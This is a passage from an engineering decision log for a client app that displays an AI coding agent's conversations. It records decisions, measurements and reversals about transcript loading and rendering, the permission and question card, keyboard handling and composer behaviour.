#### Q3.21 — How is agent output rendered?

**Decision.** As markdown. `Markdown.tsx` is memoised on the joined text of a
coalesced run. Raw HTML stays off.

**Why.** The agent writes markdown and every other client renders it; this client
showed the source, so headings arrived as `###` and tables as pipes. The memo
matters because a run in flight is reparsed on every arriving chunk. An
unterminated fence renders as a growing code block, which is the right degradation
and needs no special case. Raw HTML stays off because agent output is untrusted
text quoting an untrusted repository.

**Status.** Current

#### Q3.22 — How much of a conversation is loaded and drawn?

**Decision.** All of it, and **without being asked**. `loadAll` pages backwards at
500 a time behind the tail, retries a page that fails, and keeps going until it
reaches the start of the log, the agent's own `/clear`, or the tab's ceiling of
`MAX_TRANSCRIPT_BYTES` (16 MiB — Q3.114 deleted the event count). There is no per-run budget and no control
anywhere that offers to fetch more.

**Why.** There was a render window: 1200 events held per session, the newest 400
drawn, and a button growing that by 400 more. Opening any real conversation
therefore started three or four taps from its own beginning, at a boundary that
corresponded to nothing a reader could see, offering a number counted in *events*
against a budget nobody had.

The **second** version of this entry said "holds what the daemon holds (5000,
`DEFAULT_MAX_EVENTS`)", and both halves of that had stopped being true: the daemon
does not truncate a log at all any more, and the client's own ceiling is 20 000. It
also still had a budget — `MAX_AUTO_HISTORY`, 5000 — which was the same mistake one
level up. A run stopped there and left the rest behind a button reading *"N earlier
events did not load — try again"*, i.e. this client reporting its own bookkeeping
to the reader as a failure, on the one screen whose whole job is to show a
conversation. That constant survives as the point at which the loop hands the main
thread back, and `loadStop` no longer has an arm for it.

Two things had to change for a budget to be removable rather than merely raised.
`fillWindow` is now given `HISTORY_PAGE` as its budget instead of the remaining run
allowance, which makes the budget **non-binding by construction** — a window spans
exactly that many seqs, so it can never be cut short mid-window, and `!closed` is
left meaning only what it was always documented to mean (the daemon cannot go
further back). And `loadStop` gained the daemon's own floor: `loadedFrom <= max(1,
daemonFirstSeq)` rather than `<= 1`, without which a legacy session whose oldest
surviving event is seq 6145 answers "keep going" for ever — harmless at one run per
open, a permanent request loop now that the poll re-drives it.

**Measured.** Twenty-four taps for the 4774-event session on the development
machine. Driven in `webcheck`: a 7000-event session reaches seq 1 in a single
`loadAll` of fourteen pages, and one dropped page mid-run still ends contiguous.

**Cost, measured — and the first version of this paragraph was wrong by an order
of magnitude.** It said "~84 MiB over LTE" for a pathological session, from
4.2 KiB/event. That number is `EVENTS_PAGE_BYTES / EVENTS_PAGE_LIMIT`, i.e. the
event size at which the daemon's *byte cap* starts biting a page — a boundary,
presented as an average. (The 4.2 KiB is the pair as it stood here: 2 MiB over 500.
Both have since moved — Q6.104 lowered `EVENTS_PAGE_BYTES` to 768 KiB and Q3.114
raised `EVENTS_PAGE_LIMIT` to 5000 — so the boundary is now about **157 B/event**,
which the mean below clears rather than approaches. The point the paragraph makes
is unchanged and its arithmetic is the arithmetic of the day.) Nothing on the development machine comes near it. Against
`~/.reemoat/reemoat.db` on 2026-08-13: **14 360 events over every session ever, 3.58
MiB in total, mean 261 B/event**. The largest session by bytes is 3964 events and
**1.29 MiB** (mean 342 B); the largest by count is 4787 events and **0.35 MiB**. A
full 20 000-event session at the worst mean any large session actually shows is
therefore **~6.5 MiB**, not 84.

Two things bound it further, and the entry undersold both. `loadStop` stops at the
newest `context_cleared`, so a conversation that has been cleared loads only the
segment since — for anyone who uses `/clear` that is the practical ceiling, not the
20 000. And **56% of those bytes are events the very next event supersedes** (Q6.10a),
so the honest way to shrink this is to stop recording drafts rather than to stop
loading conversations.

Nothing here bounds *bytes*, only events. The lever if it ever bites is
`MAX_TRANSCRIPT_BYTES` or a per-run request counter, not a button.

**Status.** Reversed an earlier decision

#### Q3.23 — Is there any remaining cut in the transcript?

**Decision.** One, and it is the agent's. `buildTail`'s third argument was a node
budget and is now `cut`, the lowest seq to draw: the newest `context_cleared`.
Those events are not even fetched until asked for; one control offers them back,
and `hidden` exists for it alone.

**Why.** After a `/clear` everything above is a conversation the agent has been
*told* to forget, and that is the only boundary in a transcript that means
anything. The cut is strictly *below* the marker, so the divider stays as the top
row saying a cut happened, while the `/clear` prompt that `registry.ts` appends
just before it goes with the conversation it ended.

**Status.** Current

#### Q3.24 — What makes an unbounded transcript affordable to render?

**Decision.** Appending a message no longer rebuilds the transcript. `TailRow` is
memoised on `sameNode`, a comparator rather than a signature string, and
`decisions` moved from a prop to a context.

**Why.** `buildTail` rebuilds its whole node list on every streamed token — the
events array gets a new identity, so the memo cannot help — and with no budget
that walk is the length of the history; that cost is what the 400-node break was
quietly buying. A signature string would allocate one string per node per rebuild,
which is the cost being avoided. `decisions` is a fresh `Map` per event, so as a
prop it defeated the memo on every row at once. `Markdown` was already memoised on
its text, which is the expensive half. `sameNode` is asserted in both directions:
answering `false` when nothing changed is merely slow, while answering `true` when
something did leaves a stale row on screen for ever with nothing to say so.

**Status.** Current

#### Q3.25 — What triggers scroll anchoring when older events arrive?

**Decision.** The general trigger — the oldest seq on screen fell, so what landed
went in above. The arithmetic is unchanged.

**Why.** It used to capture `scrollHeight`/`scrollTop` in the "show more" button's
own handler, which worked exactly as long as the only way to gain older events was
to press something. History arrives unasked now.

**Status.** Current

#### Q3.26 — Why does opening a tool card re-measure whether the reader is at the bottom?

**Decision.** Expanding a card triggers a re-measurement on the next frame
(`remeasure` in `SessionView`, reaching `ToolCall` through a context beside
`DecisionsContext`).

**Why.** Following the tail is keyed on `atBottom`, which is set from a scroll
event — and no scroll event fires when content grows *under* the reader. So
somebody parked at the foot of a live session who opened a card stayed
`atBottom: true`, and the next arriving event re-pinned the box to its foot,
scrolling the thing they had just opened up and out of view. Following the tail is
right; following it *over* something somebody deliberately opened is not. The
re-measurement is honest in both directions without new state: an expansion taller
than the 48px slack genuinely takes them off the bottom, so the card stays put and
the text below moves down, while a small one leaves them at the bottom and
following carries on. One frame later, because the height to read is the one
*after* React has committed the card's new state and the browser has laid it out.

**Rejected.** A "stop following" flag. It would also make the jump-to-bottom
button appear while the reader was still at the bottom.

**Status.** Current

#### Q3.27 — What does the transcript refuse to draw?

**Decision.** The daemon's bookkeeping. `— idle —`,
`— interrupted (daemon_restarted) —`, `— turn ended: end_turn —` and a
`worktree · branch` line are cut. Every other turn-end stop reason is kept. A
permission request and its answer collapse to one row, keyed on **whether an
answer exists**.

**Why.** Each cut line was *already on screen somewhere else*: the header's
`StatusDot` and `ExitNotice` for the first two, the header itself and the
`dirty_source` banner for the last. `turn_end` ran on every single reply, saying
only that the paragraph just finished reading had finished — so `end_turn` is cut
while `max_tokens`, `refusal` and `cancelled` are kept, because those are turns
that did *not* finish and are the only explanation of an agent stopping
mid-thought. The collapse is keyed on the existence of an answer rather than on
the request's own `decision` field, which the daemon leaves null for the request's
whole life, so a rule reading it would have suppressed exactly the rows it meant
to keep.

**Status.** Current

#### Q3.28 — Once request and answer are one row, how is a refusal drawn?

**Decision.** `permissionDecisions` joins the resolution to the request by
`optionId`, and `refused` reads the verdict off the request's `options`.

**Why.** Merging the pair made the surviving row's icon load-bearing, and it was
wrong: `PermissionResolvedEvent.outcome` is `"selected" | "cancelled"`, and
`selected` means *an option was chosen* — which every `reject_*` option also
produces. So a refused command was drawn with a check mark, and once the request
row was merged away that was the **only** record of the answer. The kind is not on
the resolution; it is on the request's `options`.

**Rejected.** Pattern-matching the option id. `"reject_once"` is what claude
happens to send and nothing in ACP promises the shape of an id, so the join is by
identity and an option the request never offered is drawn as neither an approval
nor a refusal.

**Status.** Current

#### Q3.100 — Does an event nobody draws break a message in two?

**Rule.** No. `buildTail` flushes the coalesced text run only when the event is
**not** in `TRANSCRIPT_SILENT`.

**Why.** The flush is what puts a boundary between two agent messages, and for a
`tool_call`, a `turn_end` or a `context_cleared` marker that boundary is real —
something is drawn between them. For a silent type it is not: the row costs no slot
and appears nowhere, so cutting the run there split one streamed message into two
independently parsed `<Markdown>` blocks with nothing on screen to explain the
break. Both types this really happens with interleave with `text` inside a single
turn: an `agent_log` is a line the agent wrote to stderr, and codex emits
`session_info_update` about five times a turn. Worst case is a fenced code block
whose chunks straddle one — an unterminated fence followed by a stray paragraph —
and the ordinary form is a word cut in half, `"here is the pl"` and `"an:"` as two
paragraphs.

**Keyed on the set, deliberately not on `showsInTranscript`**, which also answers
false for `turn_end: end_turn` — and that one *is* a boundary, because the message
after it belongs to a different turn.

**Consequence.** Text either side of a silent event merges into one run keyed by the
older event's seq, so that case draws one node where it drew two. `nodeFor` returns
`null` for every silent type, so no node ordering changes.

**Measured.** `webcheck` fails four checks on an unconditional flush —
text/`agent_log`/text answers `["here is the pl","an:"]` instead of one string, the
same fixture draws 2 rows instead of 1, codex's `other` splits a fenced block, and
the merged run is keyed `["t1","t3"]` instead of `["t1"]` — and fails the other way
if the flush is re-keyed on `showsInTranscript`, which is the plausible
"improvement".

**Status.** Current

### Waiting on a human, and the ask card

#### Q3.29 — Is a question the agent asks counted the same way as an approval?

**Decision.** Yes, through one predicate set: `humanRequests`, `needsHuman`,
`waitingCount` and `oldestWait`, asserted **as a partition** beside the five
restart predicates.

**Why.** Every count, sort, badge, dot and placeholder in this client was written
against `pendingPermissions.length` — nine call sites across five files — and a
second array beside it would have been nine separate decisions about whether a
question counts. The clause that matters is `!(needsHuman(s) && showsWorking(s))`:
a form is parked mid-turn, so `turn` stays set, and without it the transcript
blinks *working…* over a question nobody has answered. `groups.ts`'s
`machineSubline`, the collapsed-section `blockedCount` and "an approval cannot be
hidden" are **untouched** — they read `blockedCount` ← `sessionGroups` ←
`sessionLists`, which is the single line that changed. That is the argument for
the predicate rather than a happy accident, and `statusTone` needs nothing either
only because the daemon derives `blocked` from both maps too.

**Status.** Current

#### Q3.30 — Is the elicitation form ever drawn from its field names?

**Decision.** Never — only from its schema. `webcheck` pins it by running the
whole fixture again with the keys renamed to `a` and `b` and asserting an
identical form.

**Why.** claude keys an `AskUserQuestion` as `question_0`, `question_0_custom`,
`question_1`… and it would be easy to read those and fuse each "Other" box into
the question above it. Those names are what one adapter happens to send today —
the same rule as refusing to pattern-match `"reject_once"`. What falls out is that
the *generic* rendering is already almost exactly what Claude Code draws:
`message` is the prompt, which ACP makes required and which the adapter fills with
the question itself when there is only one; a select is option rows carrying each
option's own description, which is why they are rows and not a `<select>`
(`NewSession` already argues that, and an option description has the identical
nowhere-to-go problem `disabled` on an `<option>` had); and the adapter's own
`title: "Other"` field lands underneath as an optional one-line box.

**Status.** Current

#### Q3.31 — What is lost by refusing to name-match, and is it recovered?

**Decision.** Two things are lost and both are written down rather than recovered.
In the CLI the "Other" box is the last row of the same list, so typing in it
deselects the options; here they are two controls, both can hold a value, and the
adapter silently resolves it in the text's favour. And two to four questions
render as a flat list of four to eight fields with nothing saying which "Other"
belongs to which.

**Rejected.** A structural rule — *an optional options-less string field directly
after a select*. It is a guess about one adapter's folding logic wearing a general
shape: it would fuse an MCP form's `{choice, notes}` pair too, where `notes` is a
second question that has to be sent *alongside* the choice. A flat list is honest
about a flat schema, and nothing is falsely grouped.

**Status.** Known limitation

#### Q3.32 — How do the Send button and the request body stay in agreement?

**Decision.** They are the same value. `elicitationAnswer` returns
`{content, problems, canSubmit}` in one pass; the button reads one, the route
sends the other, and nothing derives either twice.

**Why.** Stronger than the `canSend` precedent, which only has to *agree* with its
route. The omission rule is where it earns that: an untouched optional field is
*absent* from the object rather than present as `""`, because the adapter reads a
non-empty custom field as overriding that question's selection, so an empty string
answers a question somebody skipped. And emptiness is tested **before** the parse
— `Number("")` is `0`, so a parse-first version silently sends a zero nobody typed
into a blank optional number field.

**Status.** Current

#### Q3.33 — How does a number field live in the draft?

**Decision.** As the string being typed. The draft type is
`string | boolean | string[]`, and `elicitationAnswer` is the only crossing to
`number`.

**Why.** `-`, `1.` and `1e` are real intermediate states, and coercing per
keystroke deletes what is in the box. A key *absent* from the draft is a third
state doing real work three times: untouched with a default sends the default,
untouched without one is omitted, and a deliberately-emptied multi-select is sent
as `[]`.

**Status.** Current

#### Q3.34 — Where do half-typed answers live?

**Decision.** In a module `Map` keyed `(SessionKey, elicitationId)` — by the
question, not the session.

**Why.** Third time this decision has been made, for the two reasons `attach.ts`
gives: not `useState`, because list → detail → back unmounts `SessionView` and a
four-question form lost that way has nothing to retype from — the questions are
the agent's; not the store, because a keystroke must not wake the session list.
Keyed by the request because two questions can park at once and the card draws the
oldest, so a session-keyed draft would be typed into one form and read out of the
other.

**Status.** Current

#### Q3.35 — How does a question and its answer appear in the transcript?

**Decision.** As one row drawn as an *exchange*: the agent's line, then the
person's answer through the same `UserBubble` every other message uses — one
component, three call sites. Skipping and cancelling have no answer to draw and
stay one quiet line.

**Why.** The mechanism is `tail.ts`'s unchanged backwards walk, which meets a
resolution before the request it answers — with **two sets rather than one**,
because a shared set would let a permission suppress a question's row invisibly.
What differs from an approval is the shape: an approval is bookkeeping about a
tool, while a question and its answer *are* the conversation, and the answer
entered the model's context. `skipped` is the adapter's own word for `decline`, so
the row and the model are told the same thing.

**Status.** Current

#### Q3.36 — Why did the permission card stop shouting?

**Decision.** It is ordinary `bg-surface`, one line naming the tool, with context
collapsed to `essentialContext` and the rest behind a `details` disclosure.

**Why.** It was a full-bleed `bg-warn/10` slab up to 40vh tall, headed
`⚠ NEEDS YOU` in uppercase, mounting between the transcript and the composer with
no warning — drawing `npm test` and `rm -rf` at identical volume several times an
hour. Every structural property it had is kept: at the foot of the conversation
where the thumb is and where it cannot scroll away; **every option visible at
once** (the exception `bits.tsx` carves out stands — hiding a reject behind a
disclosure is a safety regression); 44px answer rows and 44px decision buttons,
which are `AskCard`'s two layouts, since an answer is a row and a decision is a
button; the spinner overlaid rather than replacing the label; and de-emphasis in
fill and border but never in text. `essentialContext` and `detailContext` are a
**partition** — nothing is clipped and then un-clipped, so nothing is drawn twice
and the control sits *between* them rather than underneath what it reveals, which
is where it ended up when the file rendered first. `withheldDetail` draws the
disclosure only when something substantial is kept back — a file, a diff, an
arguments blob, locations — and never under a one-line command, which is already
on screen.

**Rejected.** A one-way disclosure. The first version did not toggle, so pressing
it removed the only way back.

**Status.** Current

#### Q3.37 — Are a permission and a question drawn by the same component?

**Decision.** Yes — `ui/AskCard.tsx` is the frame and `PermissionCard` /
`ElicitationCard` are two bodies inside it. `AskCard` owns where the card sits,
that it does not move the transcript, the collapse, the ✕, the numbered answer
rows and their hover states, and the digit shortcuts.

**Why.** For one release the state of this was two components with the same class
strings typed into each of them — "unified" by resemblance, which lasts exactly
until somebody edits one. They look alike because they are the same card, not
because one was recognised as the other.

**Rejected.** Detecting that a permission *is* a question — matching the title
`AskUserQuestion`, or "every option is `allow_once` bar one". That is the id-keyed
guessing this client refuses everywhere else, and it would be wrong for the first
agent that words it differently. An option's *tone* is still the agent's own
`PermissionOptionKind`, because only a permission has one and only a permission
needs it.

**Status.** Current

#### Q3.38 — How is the card positioned relative to the composer?

**Decision.** It is a popup at the foot of the conversation, `absolute` in a
region that ends where the composer begins — so `bottom-0` is the top of the
composer and nothing has to know how tall the composer currently is. The frame is
`inset-0` with `max-h-[min(70vh,100%)]`; the frame is `pointer-events-none` and
the card `pointer-events-auto`.

**Why.** `inset-0` rather than `bottom-0` is what *bounds* it: a card anchored to
the bottom grows upwards, and `absolute` is not clipped by an ancestor with no
`overflow`, so on a short screen a long form painted straight over the session
header. As a flex item in a container the height of the region, the max-height
cannot. The pointer-events split exists because the frame now covers the whole
conversation and every wheel event meant for the transcript has to pass through
it.

**Status.** Current

#### Q3.39 — Is there a scrim behind the ask card?

**Decision.** No. The scrim was built and removed; reading what is underneath is
the **collapse** control's job instead. The chevron folds the card to a one-line
bar that still says what is being asked, still expands and still cancels, and it
is keyed per request rather than per session.

**Why.** The first version dimmed everything behind a `bg-ink/40 backdrop-blur`,
on the reasoning that a blocker should look like one. What it actually did was
smear the text needed in order to answer — the question is *about* the
conversation. Collapsing answers nothing, which is the honest behaviour for a
control that only moves a card, and keying it per request means the next thing the
agent asks arrives open.

**Rejected.** Raising the card above the *jump to latest* button at the foot of
the transcript. That is left alone: a parked agent is producing nothing, and one
control that folds the whole card away beats a second control floating over it.

**Status.** Reversed an earlier decision

#### Q3.40 — Does the number beside each answer do anything?

**Decision.** Yes — `optionShortcut` in `keys.ts` is the rule, guarded by
`isTypingInto`, with `Shift` checked here rather than in `isBareKey`.

**Why.** The number was drawn under a comment calling it "the number a keyboard
would reach for", which is a promise the card was not keeping — so either it goes
or it works. The guard is what earns the rule a place in `keys.ts` rather than in
an `onKeyDown`: the composer sits directly under this card and takes the caret on
its own, so a digit that ignored it would approve whatever the agent was asking
with the first character of a message. `Shift` is checked here because the letter
shortcuts want `Shift+J` to stay a navigation while `Shift+1` is a character
somebody typed.

**Status.** Current

#### Q3.41 — Where does "N more waiting after this one" appear?

**Decision.** In the card's header, as a `+N` chip.

**Why.** As a strip it was another thing mounting and unmounting between the
transcript and the composer, and it vanished the moment the card was folded away —
which is precisely when knowing there are two more is worth something.

**Status.** Current

#### Q3.42 — Does the ask card animate in with a transform?

**Decision.** Yes — `--animate-rise` moves the card by six pixels.
`prefers-reduced-motion` zeroes it.

**Why.** The rule used to say "opacity only", because a `translateY` had been
tried and rejected: the card was a static-position sibling directly above the
composer, so a transform painted over the composer for the duration. The card is
`absolute` and paints above everything in the conversation region *by design* now,
so the objection is gone — the thing it was protecting is what the card
deliberately does. The reduced-motion degradation is correct rather than
tolerated: unlike the `blocked` dot, nothing about this card's *state* is carried
by the motion.

**Status.** Reversed an earlier decision

#### Q3.421 — Tapping an answer moved every row under it. Why, and what fixed it?

**Decision.** A picked row is border, fill and a `ring-1 ring-inset`. The
`font-medium` that used to be its third signal is gone, from `AskCard`'s `CHOSEN`
and from the secondary select rows in `ElicitationCard`.

**Why.** Reported with two screenshots of the same card one tap apart: the picked
row was a line taller than the same row unpicked, so the rows below it — and the
Other box and the footer with it — moved under the thumb that had just tapped.

The weight was doing less than the docblock claimed and more damage than anyone
had measured. It never reached the label, which carries its own `font-medium` and
is 500 in both states; the only thing it changed was the `text-2xs` description,
which is the one part of the row that wraps. A 500 cut of the UI face runs about
2.4% wider than the 400 cut — 553.27px against 540.17px for one line of a real
answer, measured in a headless browser at the app's own font stack and size — so a
description that fitted its last line stopped fitting. Swept over five real answer
descriptions at every row width from 320 to 760px: 66 of 1105 (width, description)
pairs gain a line from the weight alone, and **at 27% of those widths at least one
answer on the card grows**. Each line is 18px of `--text-2xs--line-height`, charged
to every row below it, which is why the defect reads as intermittent — it depends
on how much slack the last line of that particular answer happened to have.

`ring-1 ring-inset` is a `box-shadow`. It cannot move anything at any width, and it
thickens the same `fg` line the border already draws rather than spending a fourth
tone — the shape axis this palette already spends on the `blocked` dot. It is
`inset` and flush against the border rather than the focus ring's
`outline-offset: 2px`, so a focused row and a picked row stay two marks even though
`fg` is deliberately one value (Q3.209's neighbour argument, and the reason the
border is `fg` at all). `Composer.tsx`'s drop target is the same idiom for the same
reason: a state that may not move what it is drawn on.

**What is knowingly not fixed here.** The same `font-medium`-on-selected shape
exists on the menu rows (`bits.tsx`'s `Dropdown`, `AgentConfigBar`'s `Select`,
`CommandMenu`), where the *description* rewraps inside a 240px panel, and on the
machine pills in `SessionBrowser`, where the pill's own width changes and the strip
shifts sideways. Those are the same defect at a lower cost — a menu you are already
looking at, rather than the card that answers the agent — and they are listed here
so the next reader knows the sweep happened and stopped on purpose.

**Status.** Reversed an earlier decision

#### Q3.43 — Does the conversation have a measure on a wide screen?

**Decision.** Yes. `COLUMN` in `bits.tsx` is one constant shared by the
transcript, the composer and the card.

**Why.** All three were full-bleed, so on a desktop a one-line reply ran the whole
width of a 1600px window. It is one constant rather than three copies of
`max-w-3xl`, because they have to be the *same* width or the card and the composer
stop lining up with the text they belong to, which is visible immediately. It is
deliberately **not** on the scroll box: the scrollbar belongs at the window's
edge, which is what `scroll-stable` is reserving a gutter for. The composer's
rule, background and drop target stay full width, because they are chrome and a
centred rule with gaps either side reads as a card.

**Status.** Current

### What the transcript still gets wrong

#### Q3.44 — Does an interruption leave a trace in the transcript?

**Decision.** No, and that is known rather than intended. The fix, if wanted, is
one clause — `showsInTranscript` keeping a `status` event whose `exit` is non-null
and dropping `starting`/`idle`/`running`, since `StatusEvent` already carries
`exit`.

**Why.** Cutting `status` was justified as "every live state it can report is the
header's `StatusDot`" — true of the newest status and false of historical ones.
`ExitNotice` draws nothing once `exit` is null, and `armForStart` clears
`exitRecord` on resume, so after an auto-resume a deploy that landed mid-turn
leaves the reader looking at their own prompt followed by the next one with
nothing between. `registry.ts` calls that append "the whole demonstration ... it
explains the outage".

**Status.** Known limitation

#### Q3.45 — Is the agent's reasoning drawn?

**Decision.** No. Reasoning is suppressed in `tail.ts` at two call sites — `nodeFor`
refuses every other type, and `buildTail`'s own `text` branch refuses a thought
before a run is ever started. What a thought was there to say is now said once, by
the `working…` row.

**Why.** Reasoning arrived as a collapsed `thinking …` card — a box that has to be
opened to find out whether it was worth opening, several per turn, in between the
messages somebody is actually reading. The suppression is in `tail.ts` and not in
the JSX, which is the load-bearing half: a refused node spends no render budget.
The subtlety is that a dropped thought still *flushes* the run, since parts are
joined with no separator and letting the speech either side merge would run one
sentence into the next — that flush lives in the same `text` branch.
`file_change` survives the cut on functional grounds: those rows carry the only
per-file download button in the transcript.

**Status.** Current

#### Q3.46 — Can the client invent a gap in the transcript?

**Decision.** No longer. The invented branch is gone: the held transcript is
dropped and the loader pages the history back in contiguously. `GapMarker` stays,
and both of its reasons name their cause — the daemon's retention destroyed these,
or this client could not keep up.

**Why.** `store.ts` *invented* a gap: re-attaching to a session the socket LRU had
dropped, with the daemon further ahead than the client keeps, it recorded the
difference as `reason: "evicted"` and the transcript drew "N events not shown
(beyond retention)". The client had declined to fetch them and then described its
own decision as data loss, in the tone reserved for a conversation that really
does have a hole in it. The cost of the fix is refetching rather than a hole to
describe. The daemon's honest version is nearly unreachable anyway — it sends
`lagged` only when `since < oldestAvailable - 1`, while a client always attaches
at `snapshot.lastSeq` — so with the client's invention removed the marker is
reachable only through the `since = heldLast` replay path, which is the one case
where it is *true*.

**Measured.** Against the live database: a session reporting 3162 such events had
every one of them still on the daemon, whose own floor was thousands of seqs
below.

**Status.** Reversed an earlier decision

#### Q3.47 — How is real retention loss shown, given that the daemon evicts a prefix?

**Decision.** `EventList` draws a line at the top of the transcript, from
`daemonFirstSeq` and `loadedFrom` rather than from a gap: *the start of this
conversation is gone — N earlier events are past what the daemon keeps.* It is
drawn only once paging has actually reached the floor (`unfetched === 0`), and
never while a `/clear` cut is in force. A second line covers the tab's own ceiling,
which is a different sentence about a different cause.

**Why.** `GapMarker` is placed by seq *inside* the rendered window, and the daemon
evicts a **prefix** — so the one loss that actually happens is the one it
structurally cannot draw. A reader cannot tell a transcript that opens mid-word
apart from a conversation that began that way, so the first thing they conclude is
that the client failed to load it. While a `/clear` cut is in force, what is above
is the cleared conversation and its own control is the thing to read there.

**What changed.** This used to read *"A second arm covers history the daemon still
holds that `loadAll` stopped before reaching, and that one is a button."* There is
no such arm: the loader does not stop before reaching it any more (Q3.22), so the
state the button described is not one the reader can be in, and offering to retry a
fetch the client had simply given up on was the defect rather than the remedy.

Deleting it needed two things that are easy to miss. The `unfetched === 0` term is
**new**: the sentence used to be the *loser* of a ternary against the button, so it
only ever drew once paging had finished, and standing alone it would announce that
the start of a conversation is gone over a transcript with thousands of events
still arriving. And the ceiling had to grow its own line — the tab's own bound
really does cut the top off a long conversation, the button was the only thing that
had ever said so, and silence there is exactly the failure this entry exists to
prevent. A sentence and not a button, because there is nothing to retry.

**Measured.** On the development machine, session `s_a7b154a7` has `dropped: 6144`,
its oldest surviving event is seq 6145, and that event is an agent `text` chunk
containing the two characters `" for"`.

**Status.** Reversed an earlier decision

### The composer

#### Q3.48 — How is context usage shown?

**Decision.** As a ring that is pressed to open a popover with the token counts
and a bar. The percentage no longer sits beside it permanently.

**Why.** The percentage was the widest thing in the right-hand cluster, for a
reading nobody needs continuously — "roughly how full" is what a ring says at a
glance, and the exact figure is something to go and look at. Removing it also
removed the last moving part in that row, since a ring is one width at every
percentage where `9% → 10%` and `99% → 100%` each pushed the chips beside it.

**Status.** Current

#### Q3.49 — Should the context ring look like a readout or like a button?

**Decision.** Like a button. It carries the `…` button's exact string.

**Why.** It had the strip's geometry and not its box — `border-transparent` with
no background until hovered, on the argument that it is "a readout first". That
does not survive contact with the strip: it is the one thing there that opens
something when pressed while looking like it does not, and hover is not a state a
phone has.

**Status.** Reversed an earlier decision

#### Q3.50 — What does the ring show when nothing has been measured?

**Decision.** A dash in an empty track, drawn rather than taken from the icon set.

**Why.** The ring itself used to be dashed, so that "no measurement" was a
positive mark rather than an absence and could not be misread as a measured zero.
Sound reasoning, wrong result: kimi never sends `usage_update`, so that is a
circle of loose dots sitting in the composer for the whole life of every kimi
session, and it reads as damage rather than as a statement. A dash keeps what the
dashes were for and drops what they looked like — still a positive mark, so an
empty track is not left to be read as nought percent, and it is the ordinary glyph
for "no reading". It is drawn rather than taken from the icon set because `Gauge`
is already the effort chip two controls to the left in the same strip.

**Status.** Reversed an earlier decision

#### Q3.51 — Where does the client say the agent is working?

**Decision.** The transcript draws one fixed-height row at its foot while a turn
is open — the same blinking dot the session list uses, from the same constant.

**Why.** It replaces a caption under the composer that mounted and unmounted on
**every turn**, moving the box somebody was typing in by 16px; the reconnect
caption beside it went into the placeholder, which is visible for exactly the
window in which it is true and costs no height at all. No keyframe was added —
`--animate-blink` is still the only one — and under `prefers-reduced-motion` it
freezes to a solid dot, which is why the row carries the word as well.

**Status.** Current

#### Q3.52 — Does the composer take the caret when a session is opened?

**Decision.** On a desktop only, through a `useEffect` on the session key rather
than `autoFocus`. It also declines when `j`/`k` did the navigating.

**Why.** On a phone, focusing would raise the soft keyboard over half the screen
every time a session is opened to *read* it. It is a `useEffect` because at `lg`
the two-pane shell does not remount the composer on a switch. Declining after
`j`/`k` is not defensive: `keyboard.ts` switches every bare shortcut off while the
composer has focus, so without it `j` navigated exactly once and then typed a `j`.

**Status.** Current

#### Q3.53 — What counts as focus worth not stealing?

**Decision.** `focusWorthKeeping` asks the narrow question: a text field, a
`contenteditable`, or a disclosure that is actually *open* (`aria-expanded="true"`
— a collapsed one is a plain button again).

**Why.** The first version of that test read "anything is focused at all", and it
made the whole feature dead on Chromium: at `lg` the rail stays mounted, a session
row is a `<button>`, and Chromium focuses buttons on click — so `activeElement`
was always the row just tapped and the caret never moved. Safari and Firefox on
macOS do not focus buttons on click, so it worked there, which is exactly how a
hand check passes it.

**Status.** Current

#### Q3.54 — What sends a message, and what inserts a newline?

**Decision.** On a keyboard, Enter sends and Shift+Enter is a newline. **On a
coarse pointer Enter is the newline and Send is the button.** The IME guard in
`keys.ts` is not optional either way.

**Why.** With a Russian, Chinese, Japanese or Korean input method, Enter commits
the candidate being typed; `key === "Enter"` alone sends a half-finished word and
swallows the keystroke meant to finish it, on every message, invisibly from a
Latin keyboard.

A soft keyboard has no Shift+Enter, so with Enter sending there was no way to type
a newline at all — and the answer used to be a `↵` button beside the box. It was
the wrong shape twice over: it appended `\n` to the **end** of the draft while the
caret sat one field away unread, so a line break typed in the middle of a message
landed at the bottom of it; and it took 44px plus a gap out of the box you are
typing in, on the narrowest screen this app runs on. Handing the keystroke back to
the textarea instead breaks the line at the caret like any other character, which
is what every phone chat client does and what the keyboard's own return key is
already drawn as promising.

`composerKey` takes `enterSends` as a **required** argument so a new call site is a
compile error rather than a silent Enter-sends, and it gates only the fall-through
— the command menu still takes Enter while it is open, because typing `/model` on a
phone and pressing Return has to choose the command. The pointer is read with
`matchMedia` **at the keystroke** and discarded in the same tick, which is the rule
`shouldFocusComposer` in that file already states; held in state it would be the
staleness the deleted button's own comment warned about, since an iPad gaining or
losing a keyboard flips it and nothing re-renders. `enterKeyHint` is `"enter"`
unconditionally, because only a virtual keyboard ever reads it, so there is no
pointer question there and nothing that can go stale.

**Cost, stated.** A tablet with a hardware keyboard is on the touch side of that
line, so Enter inserts a newline there and Send is a tap away.

**Status.** Reversed an earlier decision

#### Q3.55 — Does the composer change appearance on focus?

**Decision.** No. The border no longer turns `accent` on focus.

**Why.** It made the box somebody is about to type in the loudest thing on the
screen for the whole time they are typing in it, where the caret already is. That
was the obvious half of the fix.

**Status.** Reversed an earlier decision

#### Q3.56 — Why did `outline-none` on the composer appear to work without working?

**Decision.** The opt-out is declared by the focus rule itself — `.no-focus-ring`,
inside its own `:where()` so the rule's specificity stays at zero — and that is
the only place able to grant one. The composer's textarea is the one place that
uses it.

**Why.** The app-wide focus rule in `index.css` is `:focus-visible`, and a text
control matches that whenever it is focused — mouse and touch included, unlike a
button — so the ring was still being drawn on every tap, under a comment saying it
was not. Specificity is not the reason and raising it does not help: Tailwind
emits every utility inside `@layer utilities`, that rule is unlayered, and
**unlayered styles beat layered ones regardless of specificity**. It is an opt-out
rather than an escape hatch: anything using it takes on showing a keyboard user
where they are, and a caret is a focus indicator in its own right. The
`ring-1 ring-accent/40` on the composer's outer div is untouched — that is the
drag-and-drop target, which is a different question.

**Measured.** Against the built CSS, `focus-visible:outline-none` at (0,2,0) still
loses to the rule's (0,1,0). Verified both ways against the real bundle: the
composer draws no outline, an ordinary button still does.

**Status.** Current

#### Q3.102 — What may `Composer` write after an await?

**Rule.** Only the halves that name the session they belong to. `drafts`,
`attach.ts`'s map and `store.applySnapshot` run unconditionally because they are
**keyed**; `text`, `echo`, `busy`, `stage`, `applying`, `pendingCaret` and
`closeMenu` are one shared React instance and are gated on `onScreen()`, which
compares a `liveKey` ref set from the `[key]` effect.

**Why.** Neither `SessionView` nor `Composer` carries a `key`, so switching session
re-renders the same instance — and `POST /sessions/:id/prompt` and `/config` are
both on the 90s slow-route budget. A `409 turn_in_flight` from session A therefore
ran `update(body)` on the composer now bound to B: A's message in B's box, where
